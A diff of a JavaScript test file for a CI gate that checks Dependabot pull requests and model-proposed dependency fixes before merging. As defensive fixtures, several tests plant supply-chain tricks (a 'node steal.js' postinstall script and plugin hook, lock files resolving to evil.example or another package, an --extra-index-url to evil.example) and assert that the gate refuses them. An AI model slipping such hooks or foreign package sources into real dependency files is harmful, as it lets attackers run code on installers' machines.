@@ -19,6 +19,8 @@ const output = (overrides = {}) => ({
 });
 // When the model job's select step ran, before any model turn.
 const RUN_STARTED = "2026-10-17T10:00:00Z";
+// The base dependabot.yml's [ecosystem, directory] pairs: a fixture.
+const PAIRS = [["github-actions", "/"], ["npm", "/"], ["npm", "/plugins/miro/server"], ["pip", "/plugins/speech"]];
 const runOf = (overrides = {}) => ({
   version: 1,
   pr: 7,
@@ -28,6 +30,7 @@ const runOf = (overrides = {}) => ({
   files_truncated: false,
   started_at: RUN_STARTED,
   controls: [],
+  config: PAIRS,
   output: output(),
   ...overrides,
 });
@@ -40,12 +43,80 @@ const laneCommit = (overrides = {}) => ({
   commit: { committer: { date: "2026-10-17T10:05:00Z" }, verification: { verified: true, reason: "valid" } },
   ...overrides,
 });
-const landed = (overrides = {}) => ({ status: "ahead", total_commits: 1, commits: [laneCommit()], files: [{ filename: "package.json" }], ...overrides });
+const modified = (filename) => ({ filename, status: "modified" });
+const landed = (overrides = {}) => ({ status: "ahead", total_commits: 1, commits: [laneCommit()], files: [modified("package.json")], ...overrides });
 
-function fakeApi({ head = HEAD, state = "open", labels = [], body = "", compare = { status: "ahead", total_commits: 0, commits: [], files: [] }, comments = [], issues = [], failClose = false } = {}) {
+// The base the verdict job reads dependabot.yml from: the same pairs as PAIRS.
+const BASE = "b".repeat(40);
+const CONFIG = [
+  "version: 2",
+  "updates:",
+  "  - package-ecosystem: github-actions",
+  "    directory: /",
+  "  - package-ecosystem: npm",
+  "    directory: /",
+  "  - package-ecosystem: npm",
+  "    directory: /plugins/miro/server",
+  "  - package-ecosystem: pip",
+  "    directory: /plugins/speech",
+  "",
+].join("\n");
+// A plain version bump of x from 1.0.0 to 2.0.0, and of numpy, on each side.
+const pkg = (range, extra = {}) => JSON.stringify({ name: "p", scripts: { test: "node t.js" }, dependencies: { x: range }, ...extra }, null, 2);
+const lock = (version, resolved = `https://registry.npmjs.org/x/-/x-${version}.tgz`, extra = {}) =>
+  JSON.stringify(
+    { lockfileVersion: 3, packages: { "": { dependencies: { x: `^${version}` } }, "node_modules/x": { version, resolved, integrity: `sha512-${"A".repeat(86)}==`, ...extra } } },
+    null,
+    2,
+  );
+const plugin = (version, extra = {}) => JSON.stringify({ name: "p", version, ...extra }, null, 2);
+const reqs = (version, hash) => `numpy==${version} \\\n    --hash=sha256:${hash.repeat(64)}\n    # via onnxruntime\n`;
+const BEFORE = { "package.json": pkg("^1.0.0"), "package-lock.json": lock("1.0.0"), "requirements.txt": reqs("2.5.3", "a"), "plugin.json": plugin("1.0.0"), "CHANGELOG.md": "# Changelog\n" };
+const AFTER = { "package.json": pkg("^2.0.0"), "package-lock.json": lock("2.0.0"), "requirements.txt": reqs("2.5.4", "b"), "plugin.json": plugin("1.0.1"), "CHANGELOG.md": "# Changelog\n\n## 1.0.1\n" };
+const nameOf = (path) => path.slice(path.lastIndexOf("/") + 1);
+
+// Dependabot's own commit: its account ids, web-flow, a valid signature.
+const dependabotCommit = (sha = HEAD) => ({
+  sha,
+  author: { id: 49699333, login: "dependabot[bot]" },
+  committer: { id: 19864447 },
+  commit: {
+    message: "build(deps): bump x from 1.0.0 to 2.0.0",
+    author: { name: "dependabot[bot]", email: "49699333+dependabot[bot]@users.noreply.github.com" },
+    committer: { email: "noreply@github.com" },
+    verification: { verified: true, reason: "valid" },
+  },
+});
+// The lanes App's commit on top of Dependabot's, with its file listing.
+const appCommit = (files, overrides = {}) => ({
+  ...laneCommit({ sha: FIX, ...overrides }),
+  commit: { message: "fix: adapt [dependabot skip]", author: { name: "lanes[bot]", email: "1+lanes[bot]@users.noreply.github.com" }, committer: { email: "noreply@github.com", date: "2026-10-17T10:05:00Z" }, verification: { verified: true, reason: "valid" } },
+  parents: [{ sha: HEAD }],
+  files,
+});
+
+// `texts` maps `${ref}:${path}` to a file's text, else BEFORE at HEAD and
+// AFTER anywhere else; `modes` maps a path to its tree entry, else a regular
+// file; `details` maps a sha to its commit with files.
+function fakeApi({
+  head = HEAD,
+  state = "open",
+  labels = [],
+  body = "",
+  compare = { status: "ahead", total_commits: 0, commits: [], files: [] },
+  comments = [],
+  issues = [],
+  failClose = false,
+  files = [{ filename: "package.json" }, { filename: "package-lock.json" }],
+  commits = [dependabotCommit(head)],
+  details = {},
+  texts = {},
+  modes = {},
+  config = CONFIG,
+} = {}) {
   // State persists across calls, so a second apply() is a re-run.
   const calls = { comments: [], closed: [], issues: [] };
-  const pull = { number: 7, state, head: { sha: head }, labels: labels.map((name) => ({ name })), body, title: "bump x from 1.0.0 to 2.0.0" };
+  const pull = { number: 7, state, head: { sha: head }, commits: commits.length, labels: labels.map((name) => ({ name })), body, title: "bump x from 1.0.0 to 2.0.0" };
   const api = {
     calls,
     pull,
@@ -53,6 +124,24 @@ function fakeApi({ head = HEAD, state = "open", labels = [], body = "", compare 
     getPull: async () => ({ ...pull }),
     listIssueComments: async () => comments,
     compare: async () => compare,
+    listPullFiles: async () => files,
+    listPullCommits: async () => commits,
+    getCommit: async (sha) => {
+      if (!details[sha]) throw new Error(`GET commit ${sha} returned 404`);
+      return details[sha];
+    },
+    async getText(path, ref) {
+      if (path === ".github/dependabot.yml") return ref === BASE ? config : null;
+      const key = `${ref}:${path}`;
+      if (key in texts) return texts[key];
+      return (ref === HEAD ? BEFORE : AFTER)[nameOf(path)] ?? null;
+    },
+    async listTree(sha, dir) {
+      const paths = [...Object.keys(modes), ...Object.values(details).flatMap((c) => (c.files ?? []).map((f) => f.filename)), ...(compare.files ?? []).map((f) => f?.filename ?? "")];
+      return [...new Set(paths)]
+        .filter((path) => path.slice(0, Math.max(path.lastIndexOf("/"), 0)) === dir)
+        .map((path) => ({ name: nameOf(path), ...(modes[path] ?? { type: "blob", mode: 0o100644 }) }));
+    },
     // The lane token holds no actions permission.
     getRun: async () => {
       throw new Error("403 Resource not accessible by integration");
@@ -77,7 +166,7 @@ function fakeApi({ head = HEAD, state = "open", labels = [], body = "", compare 
   return api;
 }
 
-const go = (api, run, extra = {}) => apply({ api, pr: 7, appId: APP, modelRun: "11-1", run, log: () => {}, ...extra });
+const go = (api, run, extra = {}) => apply({ api, pr: 7, appId: APP, modelRun: "11-1", run, baseSha: BASE, log: () => {}, ...extra });
 
 test("validateRun accepts the runner's record and refuses anything off the template", () => {
   assert.deepEqual(validateRun(runOf(), 7).output.verdict, "merge");
@@ -100,6 +189,10 @@ test("validateRun accepts the runner's record and refuses anything off the templ
     runOf({ started_at: "not a date" }),
     runOf({ started_at: "2026-10-17" }),
     runOf({ started_at: "2026-13-45T99:99:99Z" }),
+    runOf({ config: undefined }),
+    runOf({ config: "npm:/" }),
+    runOf({ config: [["npm"]] }),
+    runOf({ config: [["npm", 1]] }),
   ];
   for (const run of bad) {
     assert.throws(() => validateRun(run, 7), /invalid/i, JSON.stringify(run).slice(0, 120));
@@ -170,7 +263,7 @@ test("a fix whose comparison is not listed whole is invalid", async () => {
     assert.equal((await go(api, fix())).escalationReason, "dependency-invalid", why);
     assert.match(api.calls.comments[0], /verdict=invalid/, why);
   }
-  const under = fakeApi({ head: FIX, compare: landed({ files: many(299) }) });
+  const under = fakeApi({ head: FIX, compare: landed({ files: Array.from({ length: 299 }, () => modified("package.json")) }) });
   assert.equal((await go(under, fix())).escalationReason, "", "299 files is a whole listing");
 });
 
@@ -253,11 +346,52 @@ test("a run with no model attempt posts its `none` marker once across re-runs", 
   assert.match(api.calls.comments[0], /run=none -->/);
 });
 
-test("a fix that changed a path under .github/ is invalid", async () => {
-  for (const file of [{ filename: ".github/workflows/x.yml" }, { filename: "x.yml", previous_filename: ".github/x.yml" }]) {
+test("a fix that landed a path other than an npm or pip manifest or lock file outside .github/ is refused", async () => {
+  for (const file of [
+    modified(".github/workflows/x.yml"),
+    { filename: "x.yml", previous_filename: ".github/x.yml", status: "renamed" },
+    modified("src/index.js"),
+    { filename: "package.json", previous_filename: "src/index.js", status: "renamed" },
+    modified(".github/actions/resolve-config/package.json"),
+    modified("setup.py"),
+    modified("plugins/unlisted/package.json"),
+    { filename: "package-lock.json", status: "added" },
+  ]) {
     const api = fakeApi({ head: FIX, compare: landed({ files: [file] }) });
-    assert.equal((await go(api, fix())).escalationReason, "dependency-invalid", JSON.stringify(file));
+    assert.equal((await go(api, fix())).escalationReason, "dependency-fix-refused", JSON.stringify(file));
+    assert.doesNotMatch(api.calls.comments.join("\n"), /verdict=fix/, JSON.stringify(file));
   }
+});
+
+test("a fix that landed only manifests and lock files is recorded", async () => {
+  const files = [modified("plugins/miro/server/package.json"), modified("plugins/miro/server/package-lock.json"), modified("plugins/speech/requirements.txt")];
+  assert.deepEqual(await go(fakeApi({ head: FIX, compare: landed({ files }) }), fix()), { escalationReason: "", skipReason: "" });
+  // The pairs are the base's dependabot.yml as this job reads it, never run.json's.
+  const unreadable = fakeApi({ head: FIX, compare: landed({ files }), config: "not: a dependabot config\n" });
+  assert.equal((await go(unreadable, fix())).escalationReason, "dependency-config-unreadable", "an unreadable base config admits no fix");
+  const widened = fakeApi({ head: FIX, compare: landed({ files: [modified("plugins/unlisted/package.json")] }) });
+  assert.equal((await go(widened, fix({ config: [["npm", "/plugins/unlisted"]] }))).escalationReason, "dependency-fix-refused", "run.json's pairs widen nothing");
+});
+
+test("a merge verdict on a pull request that changes a workflow or action file escalates and posts no merge marker", async () => {
+  for (const file of [
+    { filename: ".github/workflows/ci.yml" },
+    { filename: ".github/actions/check-wip-cap/action.yml" },
+    { filename: "x.yml", previous_filename: ".github/workflows/old.yml" },
+  ]) {
+    const api = fakeApi({ files: [{ filename: "package.json" }, file] });
+    const result = await go(api, runOf());
+    assert.equal(result.escalationReason, "dependency-workflow-held", JSON.stringify(file));
+    assert.doesNotMatch(api.calls.comments.join("\n"), /verdict=merge/);
+    assert.match(api.calls.comments[0], /verdict=escalate/);
+  }
+  // A manifest under .github/ is not a workflow file.
+  assert.equal((await go(fakeApi({ files: [{ filename: ".github/actions/resolve-config/package.json" }] }), runOf())).escalationReason, "");
+});
+
+test("a merge verdict whose files listing reads at its limit escalates as truncated", async () => {
+  const files = Array.from({ length: 3000 }, (_, i) => ({ filename: `p${i}/package.json` }));
+  assert.equal((await go(fakeApi({ files }), runOf())).escalationReason, "dependency-files-truncated");
 });
 
 test("a merge verdict on an unreadable Dependabot config escalates and posts no merge marker", async () => {
@@ -336,6 +470,8 @@ test("main escalates dependency-invalid on a run.json whose SHA-256 does not mat
     GITHUB_REPOSITORY: "o/r",
     PR_NUMBER: "7",
     HEAD_SHA: HEAD,
+    BASE_SHA: BASE,
+    DEPENDENCY_HEAD_SHA: HEAD,
     GITHUB_RUN_ID: "11",
     DEPENDENCY_RUN_ATTEMPT: "1",
     APP_SENDER_ID: String(APP),
@@ -351,4 +487,110 @@ test("main escalates dependency-invalid on a run.json whose SHA-256 does not mat
   const good = { ...env, DEPENDENCY_RUN_SHA256: createHash("sha256").update(text).digest("hex"), ESCALATION_REASON_FILE: join(dir, "e2") };
   await main(good, { api: fakeApi(), log: () => {} });
   assert.throws(() => readFileSync(good.ESCALATION_REASON_FILE));
+  // run.json's head must be the head the model job's gate passed.
+  const moved = { ...good, DEPENDENCY_HEAD_SHA: FIX, ESCALATION_REASON_FILE: join(dir, "e3") };
+  await main(moved, { api: fakeApi(), log: () => {} });
+  assert.equal(readFileSync(moved.ESCALATION_REASON_FILE, "utf8"), "dependency-invalid\n");
+});
+
+// The merge path: every commit that is not Dependabot's own must be a lane fix.
+const mergeWith = (files, { modes = {}, texts = {}, overrides = {} } = {}) => {
+  const app = appCommit(files, overrides);
+  return fakeApi({ head: FIX, commits: [dependabotCommit(HEAD), app], details: { [FIX]: app }, modes, texts });
+};
+const mergeRun = () => runOf({ head_sha: FIX });
+const refused = async (api, why) => {
+  const result = await go(api, mergeRun());
+  assert.equal(result.escalationReason, "dependency-fix-refused", why);
+  assert.doesNotMatch(api.calls.comments.join("\n"), /verdict=merge/, why);
+  assert.match(api.calls.comments.join("\n"), /verdict=escalate/, why);
+};
+
+test("a merge verdict on a lanes App commit that touches .github/scripts is refused", async () => {
+  await refused(mergeWith([modified(".github/scripts/pr-unblock/dependency-classify.mjs")]), ".github/scripts");
+  await refused(mergeWith([modified("src/index.js")]), "a path outside the fix scope");
+});
+
+test("a merge verdict on a lanes App commit that makes package.json a symbolic link is refused", async () => {
+  for (const entry of [{ type: "blob", mode: 0o120000 }, { type: "commit", mode: 0o160000 }, { type: "blob", mode: 0o100755 }, undefined]) {
+    const modes = { "package.json": entry ?? { type: "tree", mode: 0o040000 } };
+    await refused(mergeWith([modified("package.json")], { modes }), JSON.stringify(entry));
+  }
+});
+
+test("a merge verdict on a lanes App commit that adds a postinstall script to package.json is refused", async () => {
+  const texts = { [`${FIX}:package.json`]: pkg("^2.0.0", { scripts: { test: "node t.js", postinstall: "node steal.js" } }) };
+  await refused(mergeWith([modified("package.json")], { texts }), "postinstall");
+});
+
+test("a merge verdict on a lanes App commit that resolves the lock to another host is refused", async () => {
+  const texts = { [`${FIX}:package-lock.json`]: lock("2.0.0", "https://evil.example/x-2.0.0.tgz") };
+  await refused(mergeWith([modified("package-lock.json")], { texts }), "non-registry resolved");
+  const repoint = { [`${FIX}:package-lock.json`]: lock("2.0.0", "https://registry.npmjs.org/evilpkg/-/evilpkg-6.6.6.tgz") };
+  await refused(mergeWith([modified("package-lock.json")], { texts: repoint }), "another package's registry tarball");
+  const script = { [`${FIX}:package-lock.json`]: lock("2.0.0", undefined, { hasInstallScript: true }) };
+  await refused(mergeWith([modified("package-lock.json")], { texts: script }), "a new install script");
+});
+
+test("a merge verdict on a lanes App commit that adds --extra-index-url to requirements is refused", async () => {
+  const path = "plugins/speech/requirements.txt";
+  const texts = { [`${FIX}:${path}`]: `--extra-index-url https://evil.example/simple\n${reqs("2.5.4", "b")}` };
+  await refused(mergeWith([modified(path)], { texts }), "--extra-index-url");
+});
+
+test("a merge verdict on a lanes App commit with a plain version bump in package.json and its lock is marked for merge", async () => {
+  const api = mergeWith([modified("package.json"), modified("package-lock.json")]);
+  assert.deepEqual(await go(api, mergeRun()), { escalationReason: "", skipReason: "" });
+  assert.match(api.calls.comments[0], /verdict=merge/);
+});
+
+test("a merge verdict admits the version-bump commit and refuses any other unproven commit", async () => {
+  const bump = {
+    sha: FIX,
+    author: { id: 41898282 },
+    committer: { id: 19864447 },
+    commit: {
+      message: "chore: bump plugin versions [dependabot skip]",
+      author: { name: "github-actions[bot]", email: "41898282+github-actions[bot]@users.noreply.github.com" },
+      committer: { email: "noreply@github.com" },
+      verification: { verified: true, reason: "valid" },
+    },
+    parents: [{ sha: HEAD }],
+    files: [modified("plugins/p/.claude-plugin/plugin.json"), modified("plugins/p/CHANGELOG.md")],
+  };
+  const ok = fakeApi({ head: FIX, commits: [dependabotCommit(HEAD), bump], details: { [FIX]: bump } });
+  assert.equal((await go(ok, mergeRun())).escalationReason, "", "the version-bump commit");
+  // A version-bump commit whose plugin.json gains anything but a version.
+  const hooks = { [`${FIX}:plugins/p/.claude-plugin/plugin.json`]: plugin("1.0.1", { hooks: { PreToolUse: [{ command: "node steal.js" }] } }) };
+  await refused(fakeApi({ head: FIX, commits: [dependabotCommit(HEAD), bump], details: { [FIX]: bump }, texts: hooks }), "a bump adding hooks");
+  // Dependabot's author text without its account ids is not Dependabot's.
+  const text = { ...dependabotCommit(FIX), author: { id: 5 }, parents: [{ sha: HEAD }], files: [modified("src/x.js")] };
+  await refused(fakeApi({ head: FIX, commits: [dependabotCommit(HEAD), text], details: { [FIX]: text } }), "Dependabot's text only");
+  // A merge commit, or one whose files cannot be read, proves nothing.
+  const merge = { ...appCommit([modified("package.json")]), parents: [{ sha: HEAD }, { sha: BASE }] };
+  await refused(fakeApi({ head: FIX, commits: [dependabotCommit(HEAD), merge], details: { [FIX]: merge } }), "two parents");
+  await refused(fakeApi({ head: FIX, commits: [dependabotCommit(HEAD), appCommit([])] }), "unreadable commit");
+});
+
+test("a merge verdict whose commits are not listed whole is refused", async () => {
+  const short = fakeApi({ head: FIX, commits: [dependabotCommit(FIX)] });
+  short.pull.commits = 2;
+  await refused(short, "fewer commits than the pull request holds");
+  const stale = fakeApi({ head: FIX, commits: [dependabotCommit(HEAD)] });
+  await refused(stale, "a listing whose last commit is not the head");
+  await refused(fakeApi({ head: FIX, commits: [] }), "no commits");
+});
+
+test("a merge verdict reads the base's dependabot.yml itself", async () => {
+  const api = fakeApi({ config: "" });
+  assert.equal((await go(api, runOf())).escalationReason, "dependency-config-unreadable");
+  assert.doesNotMatch(api.calls.comments.join("\n"), /verdict=merge/);
+});
+
+test("a fix whose content is more than a version change is refused", async () => {
+  const texts = { [`${FIX}:package.json`]: pkg("github:evil/x") };
+  const api = fakeApi({ head: FIX, compare: landed(), texts });
+  assert.equal((await go(api, fix())).escalationReason, "dependency-fix-refused");
+  const link = fakeApi({ head: FIX, compare: landed(), modes: { "package.json": { type: "blob", mode: 0o120000 } } });
+  assert.equal((await go(link, fix())).escalationReason, "dependency-fix-refused");
 });
